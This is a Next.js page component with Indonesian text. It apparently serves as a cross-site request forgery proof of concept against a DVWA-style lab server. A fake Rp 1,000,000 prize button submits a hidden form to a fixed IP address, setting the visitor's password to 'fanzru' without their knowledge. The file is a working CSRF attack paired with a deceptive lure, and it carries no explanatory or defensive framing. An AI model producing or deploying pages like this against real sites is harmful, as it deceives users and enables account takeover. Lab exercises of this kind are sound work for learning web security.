import Head from 'next/head'
import { useRouter } from 'next/router'
export default function Home() {
  const router = useRouter();
  return (
    <div className="bg-base-200">
      <div className="flex h-screen items-center justify center container">
        <div className={"border-2 border-cyan-500 border-dashed mx-auto px-10 py-20 rounded-md shadow-lg shadow-cyan-500/50"}>
          <div className={"text-5xl font-nunito font-bold text-cyan-500 "}>Dapatkan uang senilai Rp 1.000.000,00</div>
          {/* <div className={"mt-5 flex justify-center"}>
            <button
            onClick={() =>{router.push("/reward")}} 
            className="bg-cyan-500 shadow-lg shadow-cyan-500/50 text-white px-2 py-2 rounded-md font-bold">Klik Disini</button>
          </div> */}
          <form action="http://103.171.85.200:1000/vulnerabilities/csrf/" method="get">
                <input type="hidden" autocomplete="off" value="fanzru" name="password_new" />
                <input type="hidden" autocomplete="off" value="fanzru" name="password_conf" />
                <div className={"mt-5 flex justify-center"}>
                  <input type="submit" autocomplete="off" value="Klik Disini" name="Change" className="bg-cyan-500 shadow-lg shadow-cyan-500/50 text-white px-2 py-2 rounded-md font-bold"></input>
                </div>
            </form>
        </div>
      </div>
    </div>
  )
}
